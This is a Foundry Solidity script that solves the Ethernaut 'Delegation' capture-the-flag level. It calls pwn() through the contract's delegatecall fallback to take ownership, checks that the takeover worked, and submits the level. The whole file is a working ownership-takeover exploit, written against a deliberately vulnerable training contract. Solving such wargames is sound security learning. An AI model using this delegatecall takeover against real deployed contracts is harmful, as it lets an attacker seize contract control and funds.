// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {Delegate, Delegation} from "../src/Level06.sol";

contract Level06 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address me = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        Delegation instance = Delegation(vm.envAddress("LVL06_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console2.log("owner: ", instance.owner());

        (bool success, bytes memory data) = address(instance).call(abi.encodeWithSignature("pwn()"));

        address owner = instance.owner();
        console2.log("owner: ", owner);

        if (success && owner == me) {
            console2.log("Level06: Success");
            ethernaut.submitLevelInstance(address(instance));
        } else {
            console2.log("Level06: Fail");
        }

        vm.stopBroadcast();
    }
}
